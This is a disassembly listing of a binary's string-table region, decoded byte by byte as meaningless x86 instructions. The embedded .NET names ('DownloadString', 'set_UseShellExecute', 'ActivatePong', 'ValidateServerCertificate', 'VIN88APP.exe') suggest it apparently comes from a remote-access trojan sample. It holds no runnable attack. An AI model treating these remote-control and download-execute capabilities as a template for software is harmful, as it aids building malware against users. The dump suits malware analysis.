  405e8e:	6c                   	insb   (%dx),%es:(%edi)
  405e8f:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  405e96:	6e 
  405e97:	4e                   	dec    %esi
  405e98:	61                   	popa
  405e99:	6d                   	insl   (%dx),%es:(%edi)
  405e9a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  405e9e:	74 5f                	je     0x405eff
  405ea0:	55                   	push   %ebp
  405ea1:	73 65                	jae    0x405f08
  405ea3:	72 4e                	jb     0x405ef3
  405ea5:	61                   	popa
  405ea6:	6d                   	insl   (%dx),%es:(%edi)
  405ea7:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  405eab:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  405eaf:	6f                   	outsl  %ds:(%esi),(%dx)
  405eb0:	73 74                	jae    0x405f26
  405eb2:	4e                   	dec    %esi
  405eb3:	61                   	popa
  405eb4:	6d                   	insl   (%dx),%es:(%edi)
  405eb5:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  405eb9:	6d                   	insl   (%dx),%es:(%edi)
  405eba:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  405ebf:	65 54                	gs push %esp
  405ec1:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  405ec8:	5f                   	pop    %edi
  405ec9:	4c                   	dec    %esp
  405eca:	61                   	popa
  405ecb:	73 74                	jae    0x405f41
  405ecd:	57                   	push   %edi
  405ece:	72 69                	jb     0x405f39
  405ed0:	74 65                	je     0x405f37
  405ed2:	54                   	push   %esp
  405ed3:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  405eda:	6e                   	outsb  %ds:(%esi),(%dx)
  405edb:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  405ee2:	54                   	push   %esp
  405ee3:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  405eea:	74 65                	je     0x405f51
  405eec:	4c                   	dec    %esp
  405eed:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  405ef4:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  405ef7:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  405efb:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  405f02:	6d                   	insl   (%dx),%es:(%edi)
  405f03:	65 54                	gs push %esp
  405f05:	79 70                	jns    0x405f77
  405f07:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  405f0b:	6c                   	insb   (%dx),%es:(%edi)
  405f0c:	75 65                	jne    0x405f73
  405f0e:	54                   	push   %esp
  405f0f:	79 70                	jns    0x405f81
  405f11:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  405f15:	6f                   	outsl  %ds:(%esi),(%dx)
  405f16:	74 6f                	je     0x405f87
  405f18:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  405f1b:	54                   	push   %esp
  405f1c:	79 70                	jns    0x405f8e
  405f1e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405f22:	74 54                	je     0x405f78
  405f24:	79 70                	jns    0x405f96
  405f26:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  405f2a:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  405f2d:	74 54                	je     0x405f83
  405f2f:	79 70                	jns    0x405fa1
  405f31:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  405f35:	73 74                	jae    0x405fab
  405f37:	65 6d                	gs insl (%dx),%es:(%edi)
  405f39:	2e 43                	cs inc %ebx
  405f3b:	6f                   	outsl  %ds:(%esi),(%dx)
  405f3c:	72 65                	jb     0x405fa3
  405f3e:	00 53 65             	add    %dl,0x65(%ebx)
  405f41:	72 76                	jb     0x405fb9
  405f43:	65 72 73             	gs jb  0x405fb9
  405f46:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  405f4d:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  405f51:	6f                   	outsl  %ds:(%esi),(%dx)
  405f52:	73 65                	jae    0x405fb9
  405f54:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  405f58:	70 6f                	jo     0x405fc9
  405f5a:	73 65                	jae    0x405fc1
  405f5c:	00 53 74             	add    %dl,0x74(%ebx)
  405f5f:	72 52                	jb     0x405fb3
  405f61:	65 76 65             	gs jbe 0x405fc9
  405f64:	72 73                	jb     0x405fd9
  405f66:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  405f6a:	30 39                	xor    %bh,(%ecx)
  405f6c:	43                   	inc    %ebx
  405f6d:	65 72 74             	gs jb  0x405fe4
  405f70:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405f77:	00 56 61             	add    %dl,0x61(%esi)
  405f7a:	6c                   	insb   (%dx),%es:(%edi)
  405f7b:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  405f82:	72 
  405f83:	76 65                	jbe    0x405fea
  405f85:	72 43                	jb     0x405fca
  405f87:	65 72 74             	gs jb  0x405ffe
  405f8a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405f91:	00 63 65             	add    %ah,0x65(%ebx)
  405f94:	72 74                	jb     0x40600a
  405f96:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405f9d:	00 43 72             	add    %al,0x72(%ebx)
  405fa0:	65 61                	gs popa
  405fa2:	74 65                	je     0x406009
  405fa4:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  405fa8:	75 67                	jne    0x406011
  405faa:	67 65 72 42          	addr16 gs jb 0x405ff0
  405fae:	72 6f                	jb     0x40601f
  405fb0:	77 73                	ja     0x406025
  405fb2:	61                   	popa
  405fb3:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  405fb7:	74 61                	je     0x40601a
  405fb9:	74 65                	je     0x406020
  405fbb:	00 53 65             	add    %dl,0x65(%ebx)
  405fbe:	74 54                	je     0x406014
  405fc0:	68 72 65 61 64       	push   $0x64616572
  405fc5:	45                   	inc    %ebp
  405fc6:	78 65                	js     0x40602d
  405fc8:	63 75 74             	arpl   %esi,0x74(%ebp)
  405fcb:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  405fd2:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  405fd7:	65 74 65             	gs je  0x40603f
  405fda:	00 43 61             	add    %al,0x61(%ebx)
  405fdd:	6c                   	insb   (%dx),%es:(%edi)
  405fde:	6c                   	insb   (%dx),%es:(%edi)
  405fdf:	53                   	push   %ebx
  405fe0:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  405fe7:	74 
  405fe8:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405fec:	6d                   	insl   (%dx),%es:(%edi)
  405fed:	70 69                	jo     0x406058
  405fef:	6c                   	insb   (%dx),%es:(%edi)
  405ff0:	65 72 47             	gs jb  0x40603a
  405ff3:	65 6e                	outsb  %gs:(%esi),(%dx)
  405ff5:	65 72 61             	gs jb  0x406059
  405ff8:	74 65                	je     0x40605f
  405ffa:	64 41                	fs inc %ecx
  405ffc:	74 74                	je     0x406072
  405ffe:	72 69                	jb     0x406069
  406000:	62 75 74             	bound  %esi,0x74(%ebp)
  406003:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  406008:	75 67                	jne    0x406071
  40600a:	67 61                	addr16 popa
  40600c:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406010:	74 74                	je     0x406086
  406012:	72 69                	jb     0x40607d
  406014:	62 75 74             	bound  %esi,0x74(%ebp)
  406017:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40601c:	75 67                	jne    0x406085
  40601e:	67 65 72 42          	addr16 gs jb 0x406064
  406022:	72 6f                	jb     0x406093
  406024:	77 73                	ja     0x406099
  406026:	61                   	popa
  406027:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40602b:	74 74                	je     0x4060a1
  40602d:	72 69                	jb     0x406098
  40602f:	62 75 74             	bound  %esi,0x74(%ebp)
  406032:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406036:	6d                   	insl   (%dx),%es:(%edi)
  406037:	56                   	push   %esi
  406038:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40603f:	74 74                	je     0x4060b5
  406041:	72 69                	jb     0x4060ac
  406043:	62 75 74             	bound  %esi,0x74(%ebp)
  406046:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40604a:	73 65                	jae    0x4060b1
  40604c:	6d                   	insl   (%dx),%es:(%edi)
  40604d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  406051:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  406058:	72 
  406059:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  406060:	73 73                	jae    0x4060d5
  406062:	65 6d                	gs insl (%dx),%es:(%edi)
  406064:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  406068:	72 61                	jb     0x4060cb
  40606a:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40606d:	61                   	popa
  40606e:	72 6b                	jb     0x4060db
  406070:	41                   	inc    %ecx
  406071:	74 74                	je     0x4060e7
  406073:	72 69                	jb     0x4060de
  406075:	62 75 74             	bound  %esi,0x74(%ebp)
  406078:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40607d:	67 65 74 46          	addr16 gs je 0x4060c7
  406081:	72 61                	jb     0x4060e4
  406083:	6d                   	insl   (%dx),%es:(%edi)
  406084:	65 77 6f             	gs ja  0x4060f6
  406087:	72 6b                	jb     0x4060f4
  406089:	41                   	inc    %ecx
  40608a:	74 74                	je     0x406100
  40608c:	72 69                	jb     0x4060f7
  40608e:	62 75 74             	bound  %esi,0x74(%ebp)
  406091:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406095:	73 65                	jae    0x4060fc
  406097:	6d                   	insl   (%dx),%es:(%edi)
  406098:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40609c:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4060a3:	69 
  4060a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4060a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4060a6:	41                   	inc    %ecx
  4060a7:	74 74                	je     0x40611d
  4060a9:	72 69                	jb     0x406114
  4060ab:	62 75 74             	bound  %esi,0x74(%ebp)
  4060ae:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4060b2:	73 65                	jae    0x406119
  4060b4:	6d                   	insl   (%dx),%es:(%edi)
  4060b5:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4060b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4060bb:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4060c1:	74 69                	je     0x40612c
  4060c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4060c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4060c5:	41                   	inc    %ecx
  4060c6:	74 74                	je     0x40613c
  4060c8:	72 69                	jb     0x406133
  4060ca:	62 75 74             	bound  %esi,0x74(%ebp)
  4060cd:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4060d1:	73 65                	jae    0x406138
  4060d3:	6d                   	insl   (%dx),%es:(%edi)
  4060d4:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4060d8:	65 73 63             	gs jae 0x40613e
  4060db:	72 69                	jb     0x406146
  4060dd:	70 74                	jo     0x406153
  4060df:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4060e6:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  4060ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ee:	6d                   	insl   (%dx),%es:(%edi)
  4060ef:	70 69                	jo     0x40615a
  4060f1:	6c                   	insb   (%dx),%es:(%edi)
  4060f2:	61                   	popa
  4060f3:	74 69                	je     0x40615e
  4060f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4060f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4060f7:	52                   	push   %edx
  4060f8:	65 6c                	gs insb (%dx),%es:(%edi)
  4060fa:	61                   	popa
  4060fb:	78 61                	js     0x40615e
  4060fd:	74 69                	je     0x406168
  4060ff:	6f                   	outsl  %ds:(%esi),(%dx)
  406100:	6e                   	outsb  %ds:(%esi),(%dx)
  406101:	73 41                	jae    0x406144
  406103:	74 74                	je     0x406179
  406105:	72 69                	jb     0x406170
  406107:	62 75 74             	bound  %esi,0x74(%ebp)
  40610a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40610e:	73 65                	jae    0x406175
  406110:	6d                   	insl   (%dx),%es:(%edi)
  406111:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  406115:	72 6f                	jb     0x406186
  406117:	64 75 63             	fs jne 0x40617d
  40611a:	74 41                	je     0x40615d
  40611c:	74 74                	je     0x406192
  40611e:	72 69                	jb     0x406189
  406120:	62 75 74             	bound  %esi,0x74(%ebp)
  406123:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406127:	73 65                	jae    0x40618e
  406129:	6d                   	insl   (%dx),%es:(%edi)
  40612a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40612e:	6f                   	outsl  %ds:(%esi),(%dx)
  40612f:	70 79                	jo     0x4061aa
  406131:	72 69                	jb     0x40619c
  406133:	67 68 74 41 74 74    	addr16 push $0x74744174
  406139:	72 69                	jb     0x4061a4
  40613b:	62 75 74             	bound  %esi,0x74(%ebp)
  40613e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406142:	73 65                	jae    0x4061a9
  406144:	6d                   	insl   (%dx),%es:(%edi)
  406145:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  406149:	6f                   	outsl  %ds:(%esi),(%dx)
  40614a:	6d                   	insl   (%dx),%es:(%edi)
  40614b:	70 61                	jo     0x4061ae
  40614d:	6e                   	outsb  %ds:(%esi),(%dx)
  40614e:	79 41                	jns    0x406191
  406150:	74 74                	je     0x4061c6
  406152:	72 69                	jb     0x4061bd
  406154:	62 75 74             	bound  %esi,0x74(%ebp)
  406157:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40615b:	6e                   	outsb  %ds:(%esi),(%dx)
  40615c:	74 69                	je     0x4061c7
  40615e:	6d                   	insl   (%dx),%es:(%edi)
  40615f:	65 43                	gs inc %ebx
  406161:	6f                   	outsl  %ds:(%esi),(%dx)
  406162:	6d                   	insl   (%dx),%es:(%edi)
  406163:	70 61                	jo     0x4061c6
  406165:	74 69                	je     0x4061d0
  406167:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  40616a:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  406171:	69 
  406172:	62 75 74             	bound  %esi,0x74(%ebp)
  406175:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  406179:	74 5f                	je     0x4061da
  40617b:	55                   	push   %ebp
  40617c:	73 65                	jae    0x4061e3
  40617e:	53                   	push   %ebx
  40617f:	68 65 6c 6c 45       	push   $0x456c6c65
  406184:	78 65                	js     0x4061eb
  406186:	63 75 74             	arpl   %esi,0x74(%ebp)
  406189:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  40618d:	74 65                	je     0x4061f4
  40618f:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  406193:	65 74 65             	gs je  0x4061fb
  406196:	56                   	push   %esi
  406197:	61                   	popa
  406198:	6c                   	insb   (%dx),%es:(%edi)
  406199:	75 65                	jne    0x406200
  40619b:	00 47 65             	add    %al,0x65(%edi)
  40619e:	74 56                	je     0x4061f6
  4061a0:	61                   	popa
  4061a1:	6c                   	insb   (%dx),%es:(%edi)
  4061a2:	75 65                	jne    0x406209
  4061a4:	00 53 65             	add    %dl,0x65(%ebx)
  4061a7:	74 56                	je     0x4061ff
  4061a9:	61                   	popa
  4061aa:	6c                   	insb   (%dx),%es:(%edi)
  4061ab:	75 65                	jne    0x406212
  4061ad:	00 76 61             	add    %dh,0x61(%esi)
  4061b0:	6c                   	insb   (%dx),%es:(%edi)
  4061b1:	75 65                	jne    0x406218
  4061b3:	00 67 65             	add    %ah,0x65(%edi)
  4061b6:	74 5f                	je     0x406217
  4061b8:	4b                   	dec    %ebx
  4061b9:	65 65 70 41          	gs gs jo 0x4061fe
  4061bd:	6c                   	insb   (%dx),%es:(%edi)
  4061be:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4061c5:	5f                   	pop    %edi
  4061c6:	4b                   	dec    %ebx
  4061c7:	65 65 70 41          	gs gs jo 0x40620c
  4061cb:	6c                   	insb   (%dx),%es:(%edi)
  4061cc:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  4061d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4061d4:	76 65                	jbe    0x40623b
  4061d6:	00 56 49             	add    %dl,0x49(%esi)
  4061d9:	4e                   	dec    %esi
  4061da:	38 38                	cmp    %bh,(%eax)
  4061dc:	41                   	inc    %ecx
  4061dd:	50                   	push   %eax
  4061de:	50                   	push   %eax
  4061df:	2e 65 78 65          	cs js,pn 0x406248
  4061e3:	00 73 65             	add    %dh,0x65(%ebx)
  4061e6:	74 5f                	je     0x406247
  4061e8:	42                   	inc    %edx
  4061e9:	6c                   	insb   (%dx),%es:(%edi)
  4061ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4061eb:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  4061ee:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  4061f5:	5f                   	pop    %edi
  4061f6:	54                   	push   %esp
  4061f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4061f8:	74 61                	je     0x40625b
  4061fa:	6c                   	insb   (%dx),%es:(%edi)
  4061fb:	53                   	push   %ebx
  4061fc:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  406203:	5f                   	pop    %edi
  406204:	48                   	dec    %eax
  406205:	65 61                	gs popa
  406207:	64 65 72 53          	fs gs jb 0x40625e
  40620b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406212:	5f                   	pop    %edi
  406213:	48                   	dec    %eax
  406214:	65 61                	gs popa
  406216:	64 65 72 53          	fs gs jb 0x40626d
  40621a:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406221:	5f                   	pop    %edi
  406222:	53                   	push   %ebx
  406223:	65 6e                	outsb  %gs:(%esi),(%dx)
  406225:	64 42                	fs inc %edx
  406227:	75 66                	jne    0x40628f
  406229:	66 65 72 53          	data16 gs jb 0x406280
  40622d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  406234:	5f                   	pop    %edi
  406235:	52                   	push   %edx
  406236:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40623a:	76 65                	jbe    0x4062a1
  40623c:	42                   	inc    %edx
  40623d:	75 66                	jne    0x4062a5
  40623f:	66 65 72 53          	data16 gs jb 0x406296
  406243:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40624a:	5f                   	pop    %edi
  40624b:	4b                   	dec    %ebx
  40624c:	65 79 53             	gs jns 0x4062a2
  40624f:	69 7a 65 00 43 72 79 	imul   $0x79724300,0x65(%edx),%edi
  406256:	70 74                	jo     0x4062cc
  406258:	6f                   	outsl  %ds:(%esi),(%dx)
  406259:	43                   	inc    %ebx
  40625a:	6f                   	outsl  %ds:(%esi),(%dx)
  40625b:	6e                   	outsb  %ds:(%esi),(%dx)
  40625c:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  406262:	74 5f                	je     0x4062c3
  406264:	50                   	push   %eax
  406265:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40626c:	5f                   	pop    %edi
  40626d:	50                   	push   %eax
  40626e:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406275:	74 65                	je     0x4062dc
  406277:	6d                   	insl   (%dx),%es:(%edi)
  406278:	2e 54                	cs push %esp
  40627a:	68 72 65 61 64       	push   $0x64616572
  40627f:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  406286:	5f                   	pop    %edi
  406287:	50                   	push   %eax
  406288:	61                   	popa
  406289:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  406290:	64 64 
  406292:	5f                   	pop    %edi
  406293:	53                   	push   %ebx
  406294:	65 73 73             	gs jae 0x40630a
  406297:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40629e:	6e                   	outsb  %ds:(%esi),(%dx)
  40629f:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4062a3:	73 74                	jae    0x406319
  4062a5:	65 6d                	gs insl (%dx),%es:(%edi)
  4062a7:	45                   	inc    %ebp
  4062a8:	76 65                	jbe    0x40630f
  4062aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4062ab:	74 73                	je     0x406320
  4062ad:	5f                   	pop    %edi
  4062ae:	53                   	push   %ebx
  4062af:	65 73 73             	gs jae 0x406325
  4062b2:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4062b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4062ba:	67 00 45 6e          	add    %al,0x6e(%di)
  4062be:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4062c1:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4062c8:	74 65                	je     0x40632f
  4062ca:	6d                   	insl   (%dx),%es:(%edi)
  4062cb:	2e 44                	cs inc %esp
  4062cd:	72 61                	jb     0x406330
  4062cf:	77 69                	ja     0x40633a
  4062d1:	6e                   	outsb  %ds:(%esi),(%dx)
  4062d2:	67 2e 49             	addr16 cs dec %ecx
  4062d5:	6d                   	insl   (%dx),%es:(%edi)
  4062d6:	61                   	popa
  4062d7:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  4062de:	73 
  4062df:	74 65                	je     0x406346
  4062e1:	6d                   	insl   (%dx),%es:(%edi)
  4062e2:	2e 52                	cs push %edx
  4062e4:	75 6e                	jne    0x406354
  4062e6:	74 69                	je     0x406351
  4062e8:	6d                   	insl   (%dx),%es:(%edi)
  4062e9:	65 2e 56             	gs cs push %esi
  4062ec:	65 72 73             	gs jb  0x406362
  4062ef:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4062f6:	46                   	inc    %esi
  4062f7:	72 6f                	jb     0x406368
  4062f9:	6d                   	insl   (%dx),%es:(%edi)
  4062fa:	42                   	inc    %edx
  4062fb:	61                   	popa
  4062fc:	73 65                	jae    0x406363
  4062fe:	36 34 53             	ss xor $0x53,%al
  406301:	74 72                	je     0x406375
  406303:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  40630a:	61                   	popa
  40630b:	73 65                	jae    0x406372
  40630d:	36 34 53             	ss xor $0x53,%al
  406310:	74 72                	je     0x406384
  406312:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  406319:	6e                   	outsb  %ds:(%esi),(%dx)
  40631a:	6c                   	insb   (%dx),%es:(%edi)
  40631b:	6f                   	outsl  %ds:(%esi),(%dx)
  40631c:	61                   	popa
  40631d:	64 53                	fs push %ebx
  40631f:	74 72                	je     0x406393
  406321:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  406328:	74 72                	je     0x40639c
  40632a:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  406331:	5f                   	pop    %edi
  406332:	41                   	inc    %ecx
  406333:	73 53                	jae    0x406388
  406335:	74 72                	je     0x4063a9
  406337:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40633e:	5f                   	pop    %edi
  40633f:	41                   	inc    %ecx
  406340:	73 53                	jae    0x406395
  406342:	74 72                	je     0x4063b6
  406344:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  40634b:	41                   	inc    %ecx
  40634c:	73 53                	jae    0x4063a1
  40634e:	74 72                	je     0x4063c2
  406350:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  406357:	53                   	push   %ebx
  406358:	74 72                	je     0x4063cc
  40635a:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  406361:	73 74                	jae    0x4063d7
  406363:	72 69                	jb     0x4063ce
  406365:	6e                   	outsb  %ds:(%esi),(%dx)
  406366:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40636a:	73 74                	jae    0x4063e0
  40636c:	65 6d                	gs insl (%dx),%es:(%edi)
  40636e:	2e 44                	cs inc %esp
  406370:	72 61                	jb     0x4063d3
  406372:	77 69                	ja     0x4063dd
  406374:	6e                   	outsb  %ds:(%esi),(%dx)
  406375:	67 00 67 65          	add    %ah,0x65(%bx)
  406379:	74 5f                	je     0x4063da
  40637b:	41                   	inc    %ecx
  40637c:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406380:	61                   	popa
  406381:	74 65                	je     0x4063e8
  406383:	50                   	push   %eax
  406384:	6f                   	outsl  %ds:(%esi),(%dx)
  406385:	6e                   	outsb  %ds:(%esi),(%dx)
  406386:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40638a:	74 5f                	je     0x4063eb
  40638c:	41                   	inc    %ecx
  40638d:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  406391:	61                   	popa
  406392:	74 65                	je     0x4063f9
  406394:	50                   	push   %eax
  406395:	6f                   	outsl  %ds:(%esi),(%dx)
  406396:	6e                   	outsb  %ds:(%esi),(%dx)
  406397:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  40639b:	74 5f                	je     0x4063fc
  40639d:	45                   	inc    %ebp
  40639e:	72 72                	jb     0x406412
  4063a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4063a1:	72 44                	jb     0x4063e7
  4063a3:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  4063aa:	73 67                	jae    0x406413
  4063ac:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  4063b0:	75 67                	jne    0x406419
  4063b2:	00 43 6f             	add    %al,0x6f(%ebx)
  4063b5:	6d                   	insl   (%dx),%es:(%edi)
  4063b6:	70 75                	jo     0x40642d
  4063b8:	74 65                	je     0x40641f
  4063ba:	48                   	dec    %eax
  4063bb:	61                   	popa
  4063bc:	73 68                	jae    0x406426
  4063be:	00 73 74             	add    %dh,0x74(%ebx)
  4063c1:	72 54                	jb     0x406417
  4063c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4063c4:	48                   	dec    %eax
  4063c5:	61                   	popa
  4063c6:	73 68                	jae    0x406430
  4063c8:	00 47 65             	add    %al,0x65(%edi)
  4063cb:	74 48                	je     0x406415
  4063cd:	61                   	popa
  4063ce:	73 68                	jae    0x406438
  4063d0:	00 56 65             	add    %dl,0x65(%esi)
  4063d3:	72 69                	jb     0x40643e
  4063d5:	66 79 48             	data16 jns 0x406420
  4063d8:	61                   	popa
  4063d9:	73 68                	jae    0x406443
  4063db:	00 46 6c             	add    %al,0x6c(%esi)
  4063de:	75 73                	jne    0x406453
  4063e0:	68 00 67 65 74       	push   $0x74656700
  4063e5:	5f                   	pop    %edi
  4063e6:	45                   	inc    %ebp
  4063e7:	78 65                	js     0x40644e
  4063e9:	63 75 74             	arpl   %esi,0x74(%ebp)
  4063ec:	61                   	popa
  4063ed:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  4063f1:	61                   	popa
  4063f2:	74 68                	je     0x40645c
  4063f4:	00 47 65             	add    %al,0x65(%edi)
  4063f7:	74 54                	je     0x40644d
  4063f9:	65 6d                	gs insl (%dx),%es:(%edi)
  4063fb:	70 50                	jo     0x40644d
  4063fd:	61                   	popa
  4063fe:	74 68                	je     0x406468
  406400:	00 48 6d             	add    %cl,0x6d(%eax)
  406403:	61                   	popa
  406404:	63 53 68             	arpl   %edx,0x68(%ebx)
  406407:	61                   	popa
  406408:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  40640e:	67 74 68             	addr16 je 0x406479
  406411:	00 67 65             	add    %ah,0x65(%edi)
  406414:	74 5f                	je     0x406475
  406416:	4c                   	dec    %esp
  406417:	65 6e                	outsb  %gs:(%esi),(%dx)
  406419:	67 74 68             	addr16 je 0x406484
  40641c:	00 49 76             	add    %cl,0x76(%ecx)
  40641f:	4c                   	dec    %esp
  406420:	65 6e                	outsb  %gs:(%esi),(%dx)
  406422:	67 74 68             	addr16 je 0x40648d
  406425:	00 41 75             	add    %al,0x75(%ecx)
  406428:	74 68                	je     0x406492
  40642a:	4b                   	dec    %ebx
  40642b:	65 79 4c             	gs jns 0x40647a
  40642e:	65 6e                	outsb  %gs:(%esi),(%dx)
  406430:	67 74 68             	addr16 je 0x40649b
